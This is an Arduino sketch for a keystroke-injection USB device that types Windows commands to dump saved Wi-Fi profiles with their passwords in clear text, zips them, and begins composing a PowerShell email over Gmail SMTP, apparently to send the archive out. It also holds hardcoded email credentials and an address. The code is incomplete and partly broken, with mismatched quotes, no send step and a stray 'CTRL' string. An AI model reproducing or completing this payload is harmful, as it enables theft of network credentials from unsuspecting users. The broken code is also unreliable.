#include <Keyboard.h>

 /*
 * use this option for OSX:
 * 
 * char ctrlKey = KEY_LEFT_GUI;
 * char enterKey = KEY_RETURN;
 * 
 * use this option for Windows and Linux:
 */
 char ctrlKey = KEY_LEFT_CTRL;
 char enterKey = KEY_RETURN;

 /*
 * Use this function to press a certain key and 
 * release the key
 */
 void typeKey(int key){
    Keyboard.press(key);
    delay(100);
    Keyboard.release(key);
 }

 /*
 * use this function to enter 'Enter key' on windows
 * and 'Return key' on mac
 */
 void enterReturnKey(){
   typeKey(enterKey);
   delay(750); 
 }

/*
 * use this function to collect all 
 * wifi credentials
 */
 void collectWifiCredentials(){
    Keyboard.print("netsh wlan export profile key=clear > ./null");
    enterReturnKey();

    Keyboard.print("mkdir WifiCredentials");
    enterReturnKey();

    Keyboard.print("xcopy *.xml WifiCredentials");
    enterReturnKey();

    Keyboard.print("powershell");
    enterReturnKey();

    Keyboard.print("Compress-Archive -Path ./WifiCredentials/* -DestinationPath ./WifiCredentials.zip");
    enterReturnKey(); 

    Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
    enterReturnKey();

    Keyboard.print("$SMTPInfo = New-Object System.Net.NetworkCredential('abc@gmail.com', 'abc123??');');
    enterReturnKey();

    Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
    enterReturnKey();

    Keyboard.print("$ReportEmail.From = 'arafattanin1124std@gmail.com'");
    enterReturnKey();

    
}
 

 /*
 * Function to Initialize keyboard
 */
void setup(){
    Keyboard.init();
    delay(500);

    Keyboard.press(ctrlKey);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(500);

    Keyboard.print('CTRL');
    delay(250);

    enterReturnKey();
    collectWifiCredentials();    
}
